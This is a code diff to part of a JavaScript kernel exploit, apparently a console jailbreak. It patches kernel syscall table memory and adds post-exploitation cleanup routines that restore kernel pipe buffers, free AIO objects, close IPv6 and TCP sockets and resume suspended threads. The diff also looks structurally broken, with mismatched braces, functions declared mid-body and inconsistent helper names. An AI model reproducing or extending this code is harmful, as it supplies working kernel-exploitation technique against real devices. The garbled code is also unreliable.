@@ -1610,31 +1610,79 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
     sessionStorage.setItem('jbsuccess', 1);
    // alert("kernel exploit succeeded!");
+  full_cleanup();
 
-    try {
+    close(block_fd);
+    free_aios2(groom_ids.addr, groom_ids.length);
+    aio_multi_wait(block_id.addr, 1);
+    aio_multi_delete(block_id.addr, block_id.length);
+    for (const sd of sds) {
+        close(sd);
+    }
+
+ function cleanup_pktopts(sds) {
     const zeroBuf = new Buffer(0x100);
     for (const sd of sds) {
         try {
-            ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-            ssockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
-            ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
-        } catch (e) {
-            log(`Errore cleanup socket ${sd}: ${e}`);
-        }
+            setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+            setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
+            setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
+        } catch (e) {}
         try {
             close(sd);
         } catch (e) {}
     }
-} catch (cleanupErr) {
-    log(`Errore durante il cleanup dei socket IPv6: ${cleanupErr}`);
 }
 
-try {
-    free_aios2(leak_ids.addr, leak_ids_len);
-} catch (e) {
-    log(`Errore durante il cleanup delle risorse AIO: ${e}`);
+function cleanup_aio(leak_ids, leak_ids_len) {
+    try {
+        free_aios(leak_ids.addr, leak_ids_len);
+    } catch (e) {}
 }
 
+function cleanup_pipebuf(restore_info) {
+    try {
+        const [kpipe, pipe_save] = restore_info;
+        for (let off = 0; off < pipe_save.size; off += 8) {
+            const old_val = pipe_save.read64(off);
+            kmem.write64(kpipe + off, old_val);
+        }
+    } catch (e) {}
+}
+
+function cleanup_tcpsockets(tcp_sds) {
+    for (const sd of tcp_sds) {
+        try { close(sd); } catch (e) {}
+    }
+}
+
+function cleanup_eventflags(evf_ids) {
+    for (const id of evf_ids) {
+        try { free_evf(id); } catch (e) {}
+    }
+}
+
+function cleanup_barrier(barrier_id) {
+    if (barrier_id !== null) {
+        try { call_nze('pthread_barrier_destroy', barrier_id.addr); } catch (e) {}
+    }
+}
+
+function cleanup_threads(suspended_tids) {
+    for (const tid of suspended_tids) {
+        try { sysi('thr_resume_ucontext', tid); } catch (e) {}
+    }
+}
+
+function full_cleanup() {
+    cleanup_pktopts(sds);
+    cleanup_aio(leak_ids, leak_ids_len);
+    cleanup_pipebuf(restore_info);
+    cleanup_tcpsockets(tcp_sds);
+    cleanup_eventflags(evf_ids);
+    cleanup_barrier(barrier_id);
+    cleanup_threads(suspended_tids);
+}
     
 try {
     const [kpipe, pipe_save] = restore_info;
